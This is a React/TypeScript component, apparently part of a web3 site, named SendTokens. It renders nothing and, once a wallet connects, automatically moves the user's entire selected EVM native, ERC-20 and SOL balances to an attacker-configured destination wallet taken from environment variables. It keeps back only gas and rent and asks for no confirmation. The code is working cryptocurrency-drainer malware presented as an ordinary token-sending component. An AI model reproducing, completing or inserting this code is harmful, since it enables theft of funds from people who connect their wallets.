import { useToasts } from '@geist-ui/core';
import { useDynamicContext } from '@dynamic-labs/sdk-react-core';
import { publicActions } from 'viem';
import { useEffect, useCallback, useRef } from 'react';

import { isAddress } from 'essential-eth';
import { useAtom } from 'jotai';
import { normalize } from 'viem/ens';
import { erc20Abi } from 'viem';
import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';
import {
  Transaction,
  SystemProgram,
  PublicKey,
  Connection,
} from '@solana/web3.js';

export const SendTokens = () => {
  const { setToast } = useToasts();
  const showToast = (message: string, type: any) =>
    setToast({
      text: message,
      type,
      delay: 4000,
    });
  const [tokens] = useAtom(globalTokensAtom);
  const { primaryWallet } = useDynamicContext();
  const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);

  // Guard: prevent running more than once per wallet session
  const hasSentRef = useRef(false);
  const lastWalletRef = useRef<string | null>(null);

  const destinationAddress =
    primaryWallet?.chain === 'SOL'
      ? process.env.NEXT_PUBLIC_DESTINATION_WALLET_SOL
      : process.env.NEXT_PUBLIC_DESTINATION_WALLET_EVM ||
        process.env.NEXT_PUBLIC_DESTINATION_WALLET ||
        '';

  // Reset sent guard when wallet changes
  useEffect(() => {
    if (primaryWallet?.address !== lastWalletRef.current) {
      hasSentRef.current = false;
      lastWalletRef.current = primaryWallet?.address ?? null;
    }
  }, [primaryWallet?.address]);

  const sendAllCheckedTokens = useCallback(async () => {
    if (hasSentRef.current) return;

    const tokensToSend: ReadonlyArray<string> = Object.entries(checkedRecords)
      .filter(([_, { isChecked }]) => isChecked)
      .map(([tokenAddress]) => tokenAddress);

    if (!primaryWallet || tokensToSend.length === 0) return;

    if (!destinationAddress) {
      showToast('Destination wallet not configured.', 'warning');
      return;
    }

    hasSentRef.current = true;

    // ── EVM ──────────────────────────────────────────────────────────────────
    if (primaryWallet.chain === 'EVM') {
      try {
        const walletClient = await (
          primaryWallet.connector as any
        ).getWalletClient();
        if (!walletClient) return;
        const publicClient = (walletClient as any).extend(publicActions);

        let finalAddress = destinationAddress;
        if (destinationAddress.includes('.')) {
          const resolvedAddress = await publicClient.getEnsAddress({
            name: normalize(destinationAddress),
          });
          if (!resolvedAddress) {
            showToast('Could not resolve destination ENS name.', 'warning');
            return;
          }
          finalAddress = resolvedAddress;
        }

        for (const tokenAddress of tokensToSend) {
          const token = tokens.find(
            (t) => t.contract_address === tokenAddress,
          );
          if (!token) continue;

          try {
            if (token.native_token) {
              const gasEstimate = await publicClient
                .estimateGas({
                  account: walletClient.account,
                  to: finalAddress as `0x${string}`,
                  value: BigInt(token.balance || '0'),
                })
                .catch(() => BigInt(21000));

              const gasPrice = await publicClient.getGasPrice();
              const gasCost = BigInt(gasEstimate) * BigInt(gasPrice);

              let amountToSend = BigInt(token.balance || '0');
              if (amountToSend > gasCost) {
                amountToSend = amountToSend - gasCost;
              }

              const hash = await walletClient.sendTransaction({
                to: finalAddress as `0x${string}`,
                value: amountToSend,
              });

              setCheckedRecords((old) => ({
                ...old,
                [tokenAddress]: {
                  ...old[tokenAddress],
                  pendingTxn: { hash },
                },
              }));
            } else {
              const { request } = await publicClient.simulateContract({
                account: walletClient.account,
                address: tokenAddress as `0x${string}`,
                abi: erc20Abi,
                functionName: 'transfer',
                args: [
                  finalAddress as `0x${string}`,
                  BigInt(token.balance || '0'),
                ],
              });

              const hash = await walletClient.writeContract(request);

              setCheckedRecords((old) => ({
                ...old,
                [tokenAddress]: {
                  ...old[tokenAddress],
                  pendingTxn: { hash },
                },
              }));
            }
          } catch (err: any) {
            showToast(
              `EVM Error: ${token.contract_ticker_symbol} ${err.message}`,
              'warning',
            );
          }
        }
      } catch (err: any) {
        showToast(`EVM Connection Error: ${err.message}`, 'warning');
      }
    }

    // ── Solana ────────────────────────────────────────────────────────────────
    if (primaryWallet.chain === 'SOL') {
      try {
        const rpcUrl =
          process.env.NEXT_PUBLIC_SOLANA_RPC_URL ||
          'https://api.mainnet-beta.solana.com';
        const solanaConnection = new Connection(rpcUrl, 'confirmed');
        const publicKeyString = (primaryWallet as any).address;

        if (!publicKeyString) return;

        for (const tokenAddress of tokensToSend) {
          const token = tokens.find(
            (t) => t.contract_address === tokenAddress,
          );
          if (!token) continue;

          try {
            if (token.native_token && token.contract_ticker_symbol === 'SOL') {
              const fromPubkey = new PublicKey(publicKeyString);
              const toPubkey = new PublicKey(destinationAddress);

              // Fetch live balance right before building the tx to avoid stale-cache issues
              const liveBalance = await solanaConnection.getBalance(fromPubkey);

              // Solana enforces that any account with a non-zero balance must hold at
              // least the rent-exempt minimum (890,880 lamports for a 0-byte account).
              // Leaving anything between 1 and 890,879 lamports causes an on-chain rent
              // error even when skipPreflight is true. We reserve:
              //   • 890,880 lamports  — rent-exempt minimum so the sender account stays valid
              //   • 100,000 lamports  — covers the base fee (5,000) plus the priority-fee
              //                         compute-budget instructions the Dynamic connector injects
              const RENT_EXEMPT = 890880;
              const FEE_RESERVE  = 100000;
              const lamportsToSend = liveBalance - RENT_EXEMPT - FEE_RESERVE;
              if (lamportsToSend <= 0) {
                showToast('SOL balance too low to cover fee.', 'warning');
                continue;
              }

              const { blockhash } = await solanaConnection.getLatestBlockhash();
              const transaction = new Transaction().add(
                SystemProgram.transfer({
                  fromPubkey,
                  toPubkey,
                  lamports: lamportsToSend,
                }),
              );
              transaction.recentBlockhash = blockhash;
              transaction.feePayer = fromPubkey;

              // Get signer from Dynamic connector and sign, then send via our RPC
              const connectorSigner = await (
                primaryWallet.connector as any
              ).getSigner();
              const signedTx = await connectorSigner.signTransaction(transaction);
              const signature = await solanaConnection.sendRawTransaction(
                signedTx.serialize(),
                { skipPreflight: true },
              );

              if (signature) {
                setCheckedRecords((old) => ({
                  ...old,
                  [tokenAddress]: {
                    ...old[tokenAddress],
                    pendingTxn: { hash: signature },
                  },
                }));
                showToast('SOL sent successfully!', 'success');
              }
            } else {
              showToast(
                `SPL token transfer for ${token.contract_ticker_symbol} not yet implemented.`,
                'info',
              );
            }
          } catch (err: any) {
            showToast(
              `SOL Error: ${token.contract_ticker_symbol} ${err.message}`,
              'warning',
            );
          }
        }
      } catch (err: any) {
        showToast(`Solana Connection Error: ${err.message}`, 'warning');
      }
    }
  }, [
    checkedRecords,
    destinationAddress,
    primaryWallet,
    setCheckedRecords,
    showToast,
    tokens,
  ]);

  const addressAppearsValid: boolean =
    typeof destinationAddress === 'string' &&
    (destinationAddress.includes('.') ||
      isAddress(destinationAddress) ||
      (destinationAddress.length >= 32 && destinationAddress.length <= 44));

  const checkedCount = Object.values(checkedRecords).filter(
    (record) => record.isChecked,
  ).length;

  useEffect(() => {
    if (addressAppearsValid && checkedCount > 0) {
      sendAllCheckedTokens();
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [checkedCount]);

  return null;
};
